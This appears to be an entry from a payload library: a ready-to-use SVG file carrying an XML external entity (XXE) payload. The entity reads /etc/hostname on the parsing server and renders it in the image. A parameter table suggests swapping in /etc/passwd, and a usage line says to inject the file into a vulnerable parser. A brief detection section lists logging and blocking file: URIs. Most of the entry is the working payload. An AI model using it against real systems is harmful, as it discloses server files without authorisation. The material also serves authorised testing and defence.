---
id: 7670ca48-b039-4d55-ad66-2300c5fac546
name: SVG-XXE-Read-Hostname-File
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.558840+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - Web
tags:
  - xxe
  - svg
  - file-read
validated: true
---

# SVG-XXE-Read-Hostname-File

## Code

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## Description

This code defines an external entity to read the /etc/hostname file and inserts its content into the SVG text element via XXE, allowing disclosure of the system's hostname when parsed.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| file:///etc/hostname | Local file path to read | file:///etc/passwd |
| &xxe; | Entity reference in text | &other-entity; |

## Usage

Save as an SVG and inject into a vulnerable parser. The hostname appears in the rendered text, or in error logs if reflected.

## Detection

- Log file access attempts to sensitive paths like /etc/.
- Parse logs for entity expansions in XML processing.
- Use XMLSec libraries to block file: URIs.

## Related

- [[procedures/XXE-Injection-via-SVG-Image]]
